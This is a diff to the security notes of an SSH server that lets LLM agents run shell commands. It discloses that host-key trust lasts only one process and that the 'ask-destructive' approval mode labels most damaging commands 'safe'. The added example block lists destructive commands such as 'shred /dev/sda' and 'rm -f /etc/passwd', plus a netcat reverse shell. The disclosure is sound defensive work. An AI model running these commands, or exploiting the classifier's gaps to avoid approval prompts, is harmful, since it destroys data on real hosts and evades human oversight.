@@ -42,7 +42,7 @@ SSH MCP Server gives LLM agents the ability to execute shell commands on remote 
 | Credential leakage via CLI args (CWE-214) | Credentials loaded from env vars / config files / SSH agent — never CLI args |
 | Sudo password in process list (CWE-522) | Sudo password piped via SSH channel stdin, not command-line `printf` |
 | Command injection via metadata | Sanitizer strips CR/LF/NUL from all metadata; `description` feature removed |
-| MITM attacks | TOFU host key verification by default; strict mode available |
+| MITM attacks | TOFU host key verification by default, **for the life of one process** — see "Host key trust" below; `trustedHostKey` or `--hostKeyMode=strict` for trust that survives a restart |
 | Weak SSH algorithms | Frozen algorithm allow-list per RFC 9142 (no SHA-1, no CBC, no ssh-rsa) |
 | PTY session leaks (MaxSessions) | Interactive sessions are bounded, not absent: `sessionMaxPerConnection` (default 5), `sessionIdleTimeoutMs` (10 min), `sessionBackgroundMaxMs` (1 h), and a reaper that sweeps expired sessions every 60s. One-shot commands use `exec()` and hold no channel. No persistent `su` shells |
 | Unbounded agent actions | Per-profile RBAC, rate limits, denylist, approval modes |
@@ -73,12 +73,44 @@ The last two rows are the ones to weigh before pointing this at something that m
 background `tail -f` that passes its TTL is `SIGKILL`ed by a timer, with no tool call, no
 policy check and no audit row. Set `sessionBackgroundMaxMs` and the idle TTL accordingly.
 
-**Note that `kill` classifies as `safe`.** The `signal-process` tool *is* policy-evaluated
-and audited, but the command it builds (`kill -SIGNAL pid`) is not matched by any
-destructive pattern, so `approvalPolicy = "ask-destructive"` will not prompt for it. Use
-`ask-all`, a `readOnly` profile, or a role whose bindings exclude `safe` if an agent must
-not signal arbitrary processes — those settings gate `signal-process`, and they do not gate
-any row in the table above.
+### Host key trust does not survive a restart
+
+TOFU is real while the process lives and gone when it exits. The store behind it is a
+`Map` created per `ConnectionRegistry` (`src/ssh/connection-registry.ts`); nothing reads or
+writes it to disk, and nothing consults `~/.ssh/known_hosts`. So "accept on first connect,
+verify after" means verify *within this process*.
+
+That matters most in the deployment this server is usually in. A stdio MCP server starts
+and exits with the client, so a fresh accept happens every session, and an attacker
+positioned to intercept has to win once per start rather than once ever. The mismatch error
+that makes a swapped key visible only fires against a key this process already saw.
+
+Two settings do give trust that outlives a restart, and both are checked before the store:
+
+- **`trustedHostKey` on the profile** — pin the fingerprint you expect. This is the
+  strongest option and the one to use for anything that matters.
+- **`--hostKeyMode=strict`** — refuse a host whose key is not already known. Note that with
+  an empty store this refuses *every* host on a fresh start, so it is only usable together
+  with `trustedHostKey`.
+
+**`ask-destructive` gates less than the name suggests, and `kill` is one example rather
+than the exception.** Outside the never-allowed list, the `destructive` class is produced by
+a single pattern — `/rm\s+-rf?\s+\//` — plus elevation. Everything else that damages a
+host classifies `safe`, and `safe` raises no prompt in this mode. Measured against the
+shipped classifier, all of these are `safe`:
+
+```
+rm -f /etc/passwd          mv /etc/passwd /tmp/x       truncate -s0 /etc/passwd
+rm -r -f /                 rm --recursive --force /    rm -rf ~
+shred /dev/sda             systemctl stop nginx        kill -9 <pid>
+sftp-upload (any path)     nc -e /bin/sh host 4444
+```
+
+So `ask-destructive` buys a prompt on elevation and on `rm -rf /path`. It does not buy one
+on writes, deletions spelled another way, service control, or signals. **`ask-all` is the
+mode that gates writes**, and it is the right default for a profile pointed at anything that
+matters. A `readOnly` profile, or a role whose bindings exclude `safe`, are the other two
+controls that actually cover this set.
 
 **The blast radius is the process group, not one process.** OpenSSH answers a `signal`
 channel request with `killpg()` on the command's group (`session.c`,
